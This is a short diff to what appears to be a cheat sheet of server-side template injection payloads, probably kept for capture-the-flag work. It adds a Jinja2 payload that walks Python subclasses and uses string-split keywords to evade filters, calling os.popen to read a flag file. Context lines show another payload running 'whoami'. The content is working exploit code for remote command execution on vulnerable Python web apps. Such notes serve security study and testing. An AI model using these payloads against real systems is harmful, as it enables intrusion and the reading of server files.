@@ -255,6 +255,14 @@ undefinded.__init__.__globals__['__builtins__']
 config.__class__.__init__.__globals__['os']['popen']('whoami').read()
 ```
 
+```python
+{% for x in ().__class__.__base__.__subclasses__() %}
+{% if "warning" in x.__name__ %}
+{{x.__init__.__globals__['__builtins__']['__imp' + 'ort__']('o'+'s').__dict__['po' + 'pen']('cat /this_is_the_f'+'lag.txt').read() }}
+{%endif%}
+{%endfor%}
+```
+
 ### Tornado
 
 ```python
